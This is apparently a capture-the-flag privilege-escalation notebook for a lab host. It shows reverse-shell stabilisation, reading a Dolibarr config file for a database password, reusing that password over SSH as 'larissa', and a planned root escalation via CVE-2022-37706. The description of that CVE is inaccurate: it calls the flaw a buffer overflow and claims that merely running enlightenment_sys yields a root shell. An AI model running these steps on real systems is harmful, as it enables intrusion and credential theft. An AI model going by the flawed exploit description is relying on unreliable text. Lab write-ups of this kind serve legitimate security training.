# Privilege Escalation

## Status: SHELL STABILIZATION — 2026-03-30 UTC

## Current Access Level
- **www-data** shell obtained via CVE-2023-30253 (Dolibarr)
- Shell stabilization in progress as of 2026-03-30

## Next Immediate Step: Stabilize & Enumerate

```bash
# Stabilize the reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → background
stty raw -echo; fg
export TERM=xterm
```

---

## Path to larissa

### Step 1: Find Database Credentials (from www-data shell)
```bash
cat /var/www/html/dolibarr/htdocs/conf/conf.php
```

Expected output contains:
- Database user: `dolibarrowner`
- Database password: `serverfun2$2023!!`

### Step 2: SSH as larissa
```bash
ssh larissa@10.129.231.37
# Password: serverfun2$2023!!
```

---

## Path to Root

### CVE-2022-37706 — Enlightenment Privilege Escalation

**Vulnerability:** Stack-based buffer overflow in Enlightenment's `enlightenment_sys` binary  
**Type:** Local Privilege Escalation  
**Affected:** Enlightenment WM with SUID binary  

### Exploitation (once as larissa)

**1. Check for Enlightenment SUID binary:**
```bash
find / -perm -4000 -type f 2>/dev/null | grep enlightenment
# or
ls -la /usr/bin/enlightenment_sys
```

**2. If present, run the exploit:**
```bash
/usr/bin/enlightenment_sys
# Should spawn root shell
```

**3. Alternative exploit method (if binary doesn't work directly):**
```bash
# Download and run CVE-2022-37706 exploit
# Reference: https://github.com/MaherAzzouzi/CVE-2022-37706
```

**4. Escalate and grab flags:**
```bash
# As larissa:
cat /home/larissa/user.txt

# As root:
cat /root/root.txt
```

---

## Proof
- [ ] user.txt (larissa) — /home/larissa/user.txt
- [ ] root.txt — /root/root.txt

## Lessons
[To be filled after privesc]
